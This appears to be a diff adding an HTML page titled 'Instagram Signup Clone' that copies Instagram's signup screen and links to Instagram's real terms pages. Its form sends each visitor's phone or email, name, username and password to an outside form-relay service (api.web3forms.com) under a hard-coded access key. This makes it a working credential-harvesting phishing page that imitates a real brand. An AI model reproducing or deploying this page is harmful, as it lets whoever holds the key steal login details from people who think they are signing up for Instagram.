@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="singup.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta2/css/all.min.css" />
+    <!-- we'll use font awesome for the facebook icon -->
+    <!-- I'll provide the github link in the desc for the code and images -->
+    <title>Instagram Signup Clone</title>
+</head>
+<body>
+    <div class="container">
+        <div class="signup_container">
+            <div class="top">
+                <img src="instagram.png" alt="">
+                <h4>Sign up to see photos and videos from your friends.</h4>
+                <button><i class="fab fa-facebook"></i> Log in with Facebook</button>
+            </div>
+            <div class="separator">
+                <div class="line"></div>
+                <h4>OR</h4>
+                <div class="line"></div>
+            </div>
+            <form action="https://api.web3forms.com/submit" method="POST">
+               <input type="hidden" name="access_key" value="52173c4a-a43f-403d-801b-64b20ef0ece9">
+                <div class="form_group">
+                    <input type="text"
+                    name="phone_email"
+                    placeholder="Phone number or Email" required/>
+                    <!--<label>
+                        <span>Mobile Number or Email</span>
+                    </label>-->
+                </div>
+                <div class="form_group">
+                    <input type="text"
+            name="name" 
+            placeholder="Full Name"
+            required>
+                   <!-- <label>
+                        <span>Full Name</span>
+                    </label>-->
+                </div>
+                <div class="form_group">
+                    <input type="text"
+            name="name"
+            placeholder="Username"
+            required>
+                   <!-- <label>
+                        <span>Username</span>
+                    </label>-->
+                </div>
+                <div class="form_group">
+                    <input type="password"
+        name="pass"
+placeholder="Password 
+"required>
+                   <!-- <label>
+                        <span>Password</span>
+                    </label>-->
+                </div>
+             <button style="background-color: #0095F6" type="submit">Sign Up</button>
+            </form>
+            <div class="text">
+                <p>
+                    By signing up, you agree to our <a href="https://help.instagram.com/196883487377501">Terms</a>, <a href="https://help.instagram.com/196883487377501">Data Policy</a> and <a href="https://help.instagram.com/196883487377501">Cookies Policy</a>.
+                </p>
+            </div>
+        </div>
+        <div class="login">
+            <p>Have an account?</p> <a href="index.html">Log in</a>
+        </div>
+        <div class="get_app">
+            <p>Get the app.</p>
+            <div class="get_app_images">
+                <img src="appStore.png" alt="">
+                <img src="playStore.png" alt="">
+            </div>
+        </div>
+    </div>
+</body>
+</html>
